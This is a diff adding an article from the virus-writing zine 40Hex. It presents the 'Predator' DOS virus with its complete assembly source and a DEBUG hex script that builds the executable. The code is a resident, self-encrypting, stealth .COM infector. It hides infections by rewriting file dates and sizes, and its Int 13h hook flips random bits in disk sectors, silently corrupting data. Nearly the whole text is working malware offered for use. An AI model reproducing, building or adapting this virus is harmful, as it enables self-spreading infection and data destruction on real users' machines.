@@ -1,0 +1,739 @@
+40Hex Issue 11 Volume 3 Number 2                                      File 008
+
+                                   Predator
+
+     Predator is a virus written by Phalcon/Skism's newest member, Priest.  It
+incorporates a number of stealth features.  It infects only COM files.
+Predator uses the "Century" technique of marking a virus infection; file dates
+are bumped up 100 years to designate an infection.
+
+--Predator Source Code---------------------------------------------------------
+CSEG SEGMENT
+     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
+     ORG 0h
+
+;                        Source code of the Predator
+
+;                                  Priest
+
+
+Its_Me          equ 'IM'
+
+Read_Only       equ 1
+
+Mem_Size        equ offset Finish-offset Virus_Start    ;amount of memory needed
+                                                        
+Virus_Size      equ offset Virus_End-offset Virus_Start ;size of virus
+New_Virus_Size  equ offset Finish-offset New_Virus      ;size of virus w/
+                                                        ;encryption
+
+
+Hundred_Years   equ 0c8h
+
+Version         equ 30h                   ;Get DOS Version
+Open            equ 3dh                   ;Open File
+Ext_Open        equ 6ch                   ;Extended Open File
+Execute         equ 4bh                   ;Execute
+Find_FCB        equ 11h                   ;Find File Control Block
+Find_FCB_Next   equ 12h                   ;Find next FCB
+Open_FCB        equ 0fh                   ;Open FCB
+Get_DTA         equ 2fh                   ;Get DTA address
+Find_Dir        equ 4eh                   ;Find file
+Find_Dir_Next   equ 4fh                   ;Find next file
+
+Attribute       equ 1                     ;infection flags
+Opened          equ 2
+Written         equ 4
+
+Extended_FCB    equ 0ffh                  ;Extended FCB will have the first
+                                          ;byte equal to FFh
+
+Virus_Start:    mov sp,bp                 ;restore Stack after decryption
+                sti                       ;interrupts on
+                mov ah,Version
+                mov bx,Its_Me
+                int 21h                   ;Check if already resident
+                cmp ax,Its_Me
+                jne Go_Res
+Jump_R_F:       jmp Return_File
+Go_Res:         mov ax,cs                 
+                dec ax                    ;get segment of this MCB
+MCB_ds:         mov ds,ax
+                cmp byte ptr ds:[0],'Z'   ;must be last Memory Control Block
+                jne Jump_R_F
+Found_last_MCB: mov ax,Mem_Size           ;Reserve enough for virus + data
+                mov cl,4h                 
+                shr ax,cl                 ;convert to paragraphs
+                inc ax
+                push ax
+                dec ax
+                shr ax,cl
+                shr cl,1
+                shr ax,cl                 ;convert to kilobytes
+                inc ax                    
+                push ds
+                xor bx,bx
+                mov ds,bx
+                sub word ptr ds:[413h],ax  ;take memory from int 12
+                pop ds
+                pop ax
+                sub word ptr ds:[0003h],ax  ;take it from availible memory
+                mov ax,cs
+                add ax,ds:[0003h]         ;get segment of free memory
+                mov es,ax
+                push cs
+                pop ds
+                call $+3             ;next 3 instructions find Virus_Start
+                pop si
+                sub si,(offset $-1)-offset Virus_Start
+                xor di,di
+                mov cx,Mem_Size
+                cld
+                rep movsb                 ;copy us to High Memory
+                push es
+                mov ax,offset High_Start
+                push ax
+                retf                      ;jump up there
+
+Virus_Name:     db 'Predator virus  ' 
+Copyright:      db '(c) Mar. 93  '
+Me:             db 'Priest' 
+
+File_Bytes      db 0cdh, 20h, 0h       ;first 3 bytes of infected .com file
+
+Com_Spec:       db '.COM',0h           ;only .com files can be infected
+
+High_Start:     push cs
+                pop ds
+                mov ax,3521h           ;get address of Int 21
+                int 21h
+                mov word ptr ds:[Int_21],bx      ;save it 
+                mov word ptr ds:[Int_21+2h],es
+                mov al,13h              ;get address of Int 13
+                int 21h
+                mov word ptr ds:[Int_13],bx     ;save it
+                mov word ptr ds:[Int_13+2h],es
+                mov ah,25h                   ;point Int 13 to our handler
+                mov dx,offset New_13
+                int 21h
+                mov al,21h                   ;21h too
+                mov dx,offset New_21
+                int 21h   
+                xor ax,ax
+                mov ds,ax
+                mov ax,ds:[46ch]             ;get a random number for 
+                push cs                      ; activation task
+                pop ds
+                xchg al,ah
+                add word ptr ds:[Count_Down],ax     ;Save it for count down
+Return_File:    push ss
+                pop es
+                mov di,100h
+                call $+3      ;get address of first 3 bytes of .com file
+                pop si
+                sub si,(offset $-1)-offset File_Bytes
+                push ss
+                push di
+                cld
+                movsw                           ;move them
+                movsb
+                push ss
+                pop ds
+                xor ax,ax
+                retf                           ;jump to original program
+
+
+
+New_21:         cmp ah,Open                    ;check function
+                je Infect
+                cmp ah,Ext_Open
+                je Ext_File_Open
+                cmp ah,Execute
+                je Infect
+                cmp ah,Find_FCB
+                je Stealth_FCB
+                cmp ah,Find_FCB_Next
+                je Stealth_FCB
+                cmp ah,Open_FCB
+                je Stealth_FCB_O
+                cmp ah,Find_Dir
+                je Stealth_Dir
+                cmp ah,Find_Dir_Next
+                je Stealth_Dir
+                cmp ah,Version         ;other checking for us
+                jne Jump_21
+                cmp bx,Its_Me
+                jne Jump_21
+                mov ax,bx               ;tell other that we're here
+Ret_21:         retf 0002h
+Jump_21:        jmp cs:Int_21
+
+Stealth_Dir:    jmp Hide_Find
+Stealth_FCB:    jmp Hide_FCB
+Stealth_FCB_O:  jmp Hide_FCB_O
+
+Infect_Error_J: jmp Infect_Error
+Ext_File_Open:  mov word ptr cs:[File_Pnt],si     ;Extended open uses DS:SI
+                jmp short Infect_ds
+Infect:         mov word ptr cs:[File_Pnt],dx   ;Open & Execute use DS:DX
+Infect_ds:      mov word ptr cs:[File_Pnt+2h],ds
+                mov byte ptr cs:[Infect_Status],0h  ;zero out progress byte
+                call Push_All                    ;Push all registers
+                call Hook_24    ;Hook Int 24 to avoid errors being displayed
+                call Is_Com                ;Is it a .com file?
+                jb Infect_Error_J          ;Carry flag set if it is not
+                lds dx,cs:[File_Pnt]       ;get saved address of file name
+                mov ax,4300h             ;fetch the attribute
+                push ax
+                call Old_21
+                pop ax
+                jb Infect_Error_J
+                mov byte ptr cs:[File_Attr],cl  ;save attribute
+                test cl,Read_Only   ;no need to change if not read only
+                je No_Attr_Rem
+                xor cx,cx
+                inc al
+                call Old_21                 ;if read only, then zero out
+                jb Infect_Error_J
+                or byte ptr cs:[Infect_Status],Attribute ;update progress byte
+No_Attr_Rem:    mov ax,3dc2h              ;open with write/compatibility
+                call Old_21
+                jb Infect_Error_J
+                xchg ax,bx                ;handle into bx
+                push cs
+                pop ds
+                or byte ptr ds:[Infect_Status],Opened ;update progress byte
+                mov ax,5700h                      ;get date
+                call Old_21
+                cmp dh,Hundred_Years            ;is it infected?
+                jnb Infect_Error
+                add dh,Hundred_Years            ;else add 100 years to date
+                mov word ptr ds:[File_Date],dx  ;save modified date
+                mov word ptr ds:[File_Time],cx
+                mov ah,3fh                      ;read first 3 bytes
+                mov cx,3h
+                mov dx,offset File_Bytes
+                call Old_21
+                cmp ax,cx                     ;if error, then quit
+                jne Infect_Error
+                cmp word ptr ds:[File_Bytes],'MZ' ;no .exe files 
+                je Infect_Error
+                cmp word ptr ds:[File_Bytes],'ZM'
+                je Infect_Error
+                mov al,2                ;set file pointer to end of file
+                call Set_Pnt
+                or dx,dx                ;too big?
+                jne Infect_Error
+                cmp ax,1000             ;too small?
+                jb Infect_Error
+                cmp ax,0-2000           ;still too big?
+                ja Infect_Error
+                mov di,offset Jump_Bytes    ;make a jump to end of file
+                push ax
+                add ax,100h          ;these two are for the encryption
+                mov word ptr ds:[Decrypt_Start_Off+1],ax
+                push cs
+                pop es
+                mov al,0e9h           ;e9h = JMP xxxx
+                cld
+                stosb
+                pop ax
+                sub ax,3h             ; to end of file
+                stosw
+                call Encrypt_Virus    ;encrypt the virus
+                mov ah,40h            ;write the encrypted virus and the
+                                      ;decryption routine to file
+                mov dx,offset New_Virus
+                mov cx,New_Virus_Size
+                call Old_21
+                jb Infect_Error
+                or byte ptr ds:[Infect_Status],Written ;update progress byte
+                xor al,al                              ;set file pointer to 
+                call Set_Pnt                           ;beginning of file
+                mov ah,40h                             ;write the jump
+                mov dx,offset Jump_Bytes
+                mov cx,3h
+                call Old_21
+Infect_Error:   test byte ptr cs:[Infect_Status],Opened ;was file opened?
+                je Set_Attr
+                test byte ptr cs:[Infect_Status],Written ;was file written to?
+                je Close
+                mov ax,5701h            ;if infected, restore modified date
+                mov dx,cs:[File_Date]
+                mov cx,ds:[File_Time]
+                call Old_21
+Close:          mov ah,3eh                ;close file
+                call Old_21
+Set_Attr:       test byte ptr cs:[Infect_Status],Attribute ;attribute changed?
+                je Jump_Old_21
+                mov ax,4301h              ;if changed, then restore it
+                xor cx,cx
+                mov cl,cs:[File_Attr]
+                lds dx,cs:[File_Pnt]
+                call Old_21
+Jump_Old_21:    call Unhook_24           ;unhook Int 24
+                call Pop_All             ;pop all registers
+                jmp Jump_21              ;jump to original int 21
+
+Set_Pnt:        mov ah,42h               ;set file pointer w/ al as parameter
+                xor cx,cx
+                cwd                      ;zero out dx
+                call Old_21
+                retn
+
+
+Pop_All:        pop word ptr cs:[Ret_Add]  ;save return address
+                pop es
+                pop ds
+                pop si
+                pop di
+                pop bp
+                pop dx
+                pop cx
+                pop bx
+                pop ax
+                popf
+                jmp cs:[Ret_Add]          ;jump to return address
+
+Push_All:       pop word ptr cs:[Ret_Add] ;save return address
+                pushf
+                push ax
+                push bx
+                push cx
+                push dx
+                push bp
+                push di
+                push si
+                push ds
+                push es
+                jmp cs:[Ret_Add]       ;jump to return address
+
+
+Hook_24:        call Push_All          ;push all registers
+                mov ax,3524h           ;get int 24 address
+                call Old_21
+                mov word ptr cs:[Int_24],bx   ;save address
+                mov word ptr cs:[Int_24+2h],es
+                mov ah,25h                     ;set new address to us
+                push cs
+                pop ds
+                mov dx,offset New_24
+                call Old_21
+                call Pop_All           ;pop all registers
+                retn
+
+Unhook_24:      call Push_All
+                mov ax,2524h          ;set old address back
+                lds dx,cs:[Int_24]
+                Call Old_21
+                call Pop_All
+                retn
+
+New_24:         mov al,3h          ;int 24, fail
+                iret
+
+Old_21:         pushf              ;call to original int 21
+                call cs:Int_21
+                retn
+
+;Hide_Find hides the file size increase for functions 4eh and 4fh and the
+;date change
+
+
+Hide_Find:      call Old_21         ;do the search
+                call Push_All       ;push all registers
+                jb Hide_File_Error
+                mov ah,2fh          ;get DTA address
+                call Old_21
+                cmp byte ptr es:[bx.DTA_File_Date+1h],Hundred_Years  ;Is it
+                jb Hide_File_Error                              ;infected?
+                sub byte ptr es:[bx.DTA_File_Date+1h],Hundred_Years ;Take
+                                        
+                                        ;away 100 years from date
+                
+                sub word ptr es:[bx.DTA_File_Size],New_Virus_Size   ;take
+                                        
+                                        ;away Virus_Size from file size
+
+                sbb word ptr es:[bx.DTA_File_Size+2],0    ;subtract remainder
+                                        
+                                        ;although there will not be one
+                                        ; I included it for expandibility 
+                                        ; (i.e. infecting .exe files)
+Hide_File_Error:call Pop_All            ;pop all registers
+                jmp Ret_21
+
+;Hide_FCB hides the file size increase for functions 11h and 12h and the
+;date change
+
+
+Hide_FCB:       call Old_21        ;find file
+                call Push_All      ;push registers
+                or al,al           ;al=0 if no error
+                jne Hide_FCB_Error
+                mov ah,Get_DTA     ;get address of DTA
+                call Old_21
+                cmp byte ptr ds:[bx],Extended_FCB   ;is it an extended FCB?
+                jne Hide_FCB_Reg
+                add bx,7h            ;yes, add 7 to address to skip garbage
+
+Hide_FCB_Reg:   cmp byte ptr es:[bx.DS_Date+1h],Hundred_Years ;Is it infected?
+                jb Hide_FCB_Error
+                sub byte ptr es:[bx.DS_Date+1h],Hundred_Years  ;yes, restore
+                                                ;date
+
+                sub word ptr es:[bx.DS_File_Size],New_Virus_Size ;fix size
+                sbb word ptr es:[bx.DS_File_Size+2],0  ;and remainder
+Hide_FCB_Error: call Pop_All                    ;pop all registers
+                jmp Ret_21
+
+;Hide_FCB_O hides the file size increase for function 0fh and the
+;date change
+
+Hide_FCB_O:     call Old_21               ;open FCB 
+                call Push_All             ;push all registers
+                cmp al,0h                 ;al=0 if opened, else error
+                jne Hide_FCB_O_Error
+                mov bx,dx                 ;pointer into bx
+
+                cmp byte ptr ds:[bx],Extended_FCB ;is it an extended FCB?
+                jne Hide_FCB_No_E
+                add bx,7h            ;yes, add 7 to skip garbage
+
+Hide_FCB_No_E:  cmp byte ptr ds:[bx.FCB_File_Date+1h],Hundred_Years ;infected?
+                jb Hide_FCB_O_Error
+                sub byte ptr ds:[bx.FCB_File_Date+1h],Hundred_Years ;yes,
+                                                ;fix date
+
+                sub word ptr ds:[bx.FCB_File_Size],New_Virus_Size ;fix size
+                sbb word ptr ds:[bx.FCB_File_Size+2h],0  ;and remainder
+Hide_FCB_O_Error:call Pop_All         ;pop all registers
+                jmp Ret_21
+
+Is_Com:         push cs
+                pop ds
+                les di,ds:[File_Pnt]  ;get address of file
+                xor al,al
+                mov cx,7fh
+                cld
+                repne scasb           ;scan for null byte at end of file name
+                cmp cx,7fh-5h        ;must be at least 5 bytes long, 
+                                     ;including ext. (.COM)
+                jnb Is_Not_Com
+                mov cx,5h            ;compare last five bytes to ".COM",0
+                sub di,cx
+                mov si,offset Com_Spec  ;offset of ".COM",0
+                cld
+                rep cmpsb             ;compare them
+                jne Is_Not_Com
+                clc                   ;if .com file, then clear carry flag
+                retn
+Is_Not_Com:     stc                   ;else set it
+                retn
+
+;This is the interrupt 13 handle, it's sole purpose is to complement a
+;random bit after a random number of sectors (1-65535) have been read.
+
+
+New_13:         cmp ah,2h             ;Is a sector going to be read
+                je Read_Sector
+Jump_13:        jmp cs:Int_13         ;no, continue on
+Ret_13:         call Pop_All          ;pop all registers
+                retf 0002h
+Read_Sector:    mov byte ptr cs:[Sub_Value],al  ;save number of sectors read
+                pushf
+                call cs:Int_13                  ;read the sectors
+                call Push_All                   ;push flags
+                jb Ret_13                       ;jump if error to return
+                mov al,cs:[Sub_Value]           ;get number of sectors read
+                cbw
+                sub word ptr cs:[Count_Down],ax ;subtract it from our count
+                ja Ret_13                       ;down
+                mov bx,200h                     ;200h bytes per sector
+                cwd                             ;zero dx
+                mul bx                          ;mul # of sectors by 200
+                dec ax                          ;minus one
+                xor cx,cx
+                mov ds,cx
+                mov cx,ds:[46ch]                ;get random value
+                mov word ptr cs:[Count_Down],cx ;move it into count down
+                push cx
+                and cx,ax                       ;cx must be < ax
+                add bx,cx                       ;add it to the address of 
+                pop cx                          ;where the sectors were read
+                add cl,ch                       ;randomize cl
+                rcr word ptr es:[bx],cl         ;get a random bit
+                cmc                             ;reverse it
+                rcl word ptr es:[bx],cl         ;put it back
+                jmp short Ret_13                ;jump to return 
+
+;The Encrypt_Virus module copies the decryption routine and an encrypted
+;copy of the virus to a buffer
+
+Encrypt_Virus:  xor ax,ax
+                mov ds,ax
+                mov ax,ds:[46ch]    ;get random value
+                push cs
+                pop ds
+                add byte ptr ds:[Decrypt_Value],al    ;use as encryption key 
+                mov al,ds:[Decrypt_Value]             ;get encryption key
+                add ah,al                             ;randomize ah
+                add byte ptr ds:[Decrypt_Random],ah   ;put random garbage 
+                mov si,offset Decrypt_Code          ;copy decryption routine
+                mov di,offset New_Virus
+                mov cx,offset Decrypt_End-offset Decrypt_Code
+                cld
+                rep movsb                           ;to buffer    
+                mov si,offset Virus_Start           ;copy virus
+                mov cx,((Virus_Size)/2)+1
+Encrypt_Loop:   xchg ax,cx
+                push ax
+                lodsw
+                rol ax,cl                           ;and encrypt
+                not ax
+                stosw                               ;to buffer
+                pop ax
+                xchg ax,cx
+                loop Encrypt_Loop
+                dec di                              ;fix pointer for
+                dec di                              ;decryption routine
+                sub di,offset New_Virus     ;point decryption's SP to end of
+                                            ;encrypted code for proper
+                                            ;decryption
+
+                add word ptr ds:[New_Virus+(Decrypt_Start_Off+1-Decrypt_Code)],di
+                retn
+
+;Decryption routine
+
+Decrypt_Code:   mov dx,((Virus_Size)/2)+1
+                db 0b1h                    ;mov cl,
+Decrypt_Value   db ?                    
+                cli
+                mov bp,sp
+Decrypt_Start_Off:mov sp,1234h
+Decrypt_Loop:   pop ax
+                not ax
+                ror ax,cl
+                push ax
+                jmp short $+3
+Decrypt_Random: db 12h
+                dec sp
+                dec sp
+                dec dx
+                jne Decrypt_Loop
+Decrypt_End:
+
+                db ?
+Virus_End:
+
+Jump_Bytes      db 3 dup(0)
+
+Int_13          dd ?                    
+Int_21          dd ?
+Int_24          dd ?
+
+Ret_Add         dw ?                    
+
+File_Pnt        dd ?
+
+Infect_Status   db ?
+
+File_Time       dw ?
+File_Date       dw ?
+File_Attr       db ?
+
+Count_Down      dw ?
+Sub_Value       db ?
+
+New_Virus       db Virus_Size+(offset Decrypt_End-offset Decrypt_Code)+1 dup(0)
+                
+Finish:
+
+;various structures
+
+Directory       STRUC
+DS_Drive        db ?
+DS_File_Name    db 8 dup(0)
+DS_File_Ext     db 3 dup(0)
+DS_File_Attr    db ?
+DS_Reserved     db 10 dup(0)
+DS_Time         dw ?
+DS_Date         dw ?
+DS_Start_Clust  dw ?
+DS_File_Size    dd ?
+Directory       ENDS
+
+FCB             STRUC
+FCB_Drive       db ?
+FCB_File_Name   db 8 dup(0)
+FCB_File_Ext    db 3 dup(0)
+FCB_Block       dw ?
+FCB_Rec_Size    dw ?
+FCB_File_Size   dd ?
+FCB_File_Date   dw ?
+FCB_File_Time   dw ?
+FCB_Reserved    db 8 dup(0)
+FCB_Record      db ?
+FCB_Random      dd ?
+FCB             ENDS
+
+DTA             STRUC
+DTA_Reserved    db 21 dup(0)
+DTA_File_Attr   db ?
+DTA_File_Time   dw ?
+DTA_File_Date   dw ?
+DTA_File_Size   dd ?
+DTA_File_Name   db 13 dup(0)
+DTA             ENDS
+
+
+
+
+
+CSEG ENDS
+     END Virus_Start
+--Predator Debug Script--------------------------------------------------------
+n predator.com
+e 0100  8B E5 FB B4 30 BB 4D 49 CD 21 3D 4D 49 75 03 E9 
+e 0110  AF 00 8C C8 48 8E D8 80 3E 00 00 5A 75 F1 B8 64 
+e 0120  08 B1 04 D3 E8 40 50 48 D3 E8 D0 E9 D3 E8 40 1E 
+e 0130  33 DB 8E DB 29 06 13 04 1F 58 29 06 03 00 8C C8 
+e 0140  03 06 03 00 8E C0 0E 1F E8 00 00 5E 81 EE 4B 00 
+e 0150  33 FF B9 64 08 FC F3 A4 06 B8 89 00 50 CB 50 72 
+e 0160  65 64 61 74 6F 72 20 76 69 72 75 73 20 20 28 63 
+e 0170  29 20 4D 61 72 2E 20 39 33 20 20 50 72 69 65 73 
+e 0180  74 CD 20 00 2E 43 4F 4D 00 0E 1F B8 21 35 CD 21 
+e 0190  89 1E 1D 04 8C 06 1F 04 B0 13 CD 21 89 1E 19 04 
+e 01A0  8C 06 1B 04 B4 25 BA 6D 03 CD 21 B0 21 BA D8 00 
+e 01B0  CD 21 33 C0 8E D8 A1 6C 04 0E 1F 86 C4 01 06 31 
+e 01C0  04 16 07 BF 00 01 E8 00 00 5E 81 EE 48 00 16 57 
+e 01D0  FC A5 A4 16 1F 33 C0 CB 80 FC 3D 74 4B 80 FC 6C 
+e 01E0  74 3F 80 FC 4B 74 41 80 FC 11 74 2C 80 FC 12 74 
+e 01F0  27 80 FC 0F 74 25 80 FC 4E 74 1A 80 FC 4F 74 15 
+e 0200  80 FC 30 75 0B 81 FB 4D 49 75 05 8B C3 CA 02 00 
+e 0210  2E FF 2E 1D 04 E9 9A 01 E9 C5 01 E9 FA 01 E9 DC 
+e 0220  00 2E 89 36 27 04 EB 05 2E 89 16 27 04 2E 8C 1E 
+e 0230  29 04 2E C6 06 2B 04 00 E8 26 01 E8 37 01 E8 08 
+e 0240  02 72 DB 2E C5 16 27 04 B8 00 43 50 E8 5C 01 58 
+e 0250  72 CC 2E 88 0E 30 04 F6 C1 01 74 0F 33 C9 FE C0 
+e 0260  E8 48 01 72 B9 2E 80 0E 2B 04 01 B8 C2 3D E8 3A 
+e 0270  01 72 AB 93 0E 1F 80 0E 2B 04 02 B8 00 57 E8 2A 
+e 0280  01 80 FE C8 73 77 80 C6 C8 89 16 2E 04 89 0E 2C 
+e 0290  04 B4 3F B9 03 00 BA 81 00 E8 0F 01 3B C1 75 5D 
+e 02A0  81 3E 81 00 5A 4D 74 55 81 3E 81 00 4D 5A 74 4D 
+e 02B0  B0 02 E8 8F 00 0B D2 75 44 3D E8 03 72 3F 3D 30 
+e 02C0  F8 77 3A BF 16 04 50 05 00 01 A3 05 04 0E 07 B0 
+e 02D0  E9 FC AA 58 2D 03 00 AB E8 E2 01 B4 40 BA 34 04 
+e 02E0  B9 30 04 E8 C5 00 72 15 80 0E 2B 04 04 32 C0 E8 
+e 02F0  52 00 B4 40 BA 16 04 B9 03 00 E8 AE 00 2E F6 06 
+e 0300  2B 04 02 74 1C 2E F6 06 2B 04 04 74 0F B8 01 57 
+e 0310  2E 8B 16 2E 04 8B 0E 2C 04 E8 8F 00 B4 3E E8 8A 
+e 0320  00 2E F6 06 2B 04 01 74 12 B8 01 43 33 C9 2E 8A 
+e 0330  0E 30 04 2E C5 16 27 04 E8 70 00 E8 58 00 E8 0C 
+e 0340  00 E9 CC FE B4 42 33 C9 99 E8 5F 00 C3 2E 8F 06 
+e 0350  25 04 07 1F 5E 5F 5D 5A 59 5B 58 9D 2E FF 26 25 
+e 0360  04 2E 8F 06 25 04 9C 50 53 51 52 55 57 56 1E 06 
+e 0370  2E FF 26 25 04 E8 E9 FF B8 24 35 E8 2D 00 2E 89 
+e 0380  1E 21 04 2E 8C 06 23 04 B4 25 0E 1F BA A8 02 E8 
+e 0390  19 00 E8 B8 FF C3 E8 C8 FF B8 24 25 2E C5 16 21 
+e 03A0  04 E8 07 00 E8 A6 FF C3 B0 03 CF 9C 2E FF 1E 1D 
+e 03B0  04 C3 E8 F6 FF E8 A9 FF 72 20 B4 2F E8 EC FF 26 
+e 03C0  80 BF 19 00 C8 72 13 26 80 AF 19 00 C8 26 81 AF 
+e 03D0  1A 00 30 04 26 83 9F 1C 00 00 E8 70 FF E9 2D FE 
+e 03E0  E8 C8 FF E8 7B FF 0A C0 75 28 B4 2F E8 BC FF 80 
+e 03F0  3F FF 75 03 83 C3 07 26 80 BF 1A 00 C8 72 13 26 
+e 0400  80 AF 1A 00 C8 26 81 AF 1D 00 30 04 26 83 9F 1F 
+e 0410  00 00 E8 38 FF E9 F5 FD E8 90 FF E8 43 FF 3C 00 
+e 0420  75 21 8B DA 80 3F FF 75 03 83 C3 07 80 BF 15 00 
+e 0430  C8 72 10 80 AF 15 00 C8 81 AF 10 00 30 04 83 9F 
+e 0440  12 00 00 E8 07 FF E9 C4 FD 0E 1F C4 3E 27 04 32 
+e 0450  C0 B9 7F 00 FC F2 AE 83 F9 7A 73 0F B9 05 00 2B 
+e 0460  F9 BE 84 00 FC F3 A6 75 02 F8 C3 F9 C3 80 FC 02 
+e 0470  74 0B 2E FF 2E 19 04 E8 D3 FE CA 02 00 2E A2 33 
+e 0480  04 9C 2E FF 1E 19 04 E8 D7 FE 72 EB 2E A0 33 04 
+e 0490  98 2E 29 06 31 04 77 DF BB 00 02 99 F7 E3 48 33 
+e 04A0  C9 8E D9 8B 0E 6C 04 2E 89 0E 31 04 51 23 C8 03 
+e 04B0  D9 59 02 CD 26 D3 1F F5 26 D3 17 EB BA 33 C0 8E 
+e 04C0  D8 A1 6C 04 0E 1F 00 06 00 04 A0 00 04 02 E0 00 
+e 04D0  26 0F 04 BE FC 03 BF 34 04 B9 19 00 FC F3 A4 BE 
+e 04E0  00 00 B9 0C 02 91 50 AD D3 C0 F7 D0 AB 58 91 E2 
+e 04F0  F4 4F 4F 81 EF 34 04 01 3E 3D 04 C3 BA 0C 02 B1 
+e 0500  00 FA 8B EC BC 34 12 58 F7 D0 D3 C8 50 EB 01 12 
+e 0510  4C 4C 4A 75 F2 00 00 00 00 00 00 00 00 00 00 00 
+e 0520  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0530  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0540  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0550  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0560  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0580  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0590  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0600  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0610  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0620  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0630  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0640  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0650  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0660  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0670  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0680  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0690  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0700  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0720  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0730  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0740  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0750  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0760  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0770  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0780  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0790  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0800  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0810  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0820  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0830  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0840  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0850  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0860  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0870  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0880  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0890  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0900  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0910  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0920  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0930  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0940  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0950  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0960  00 00 00 00 
+
+rcx
+0864
+w
+q
+-------------------------------------------------------------------------------
+
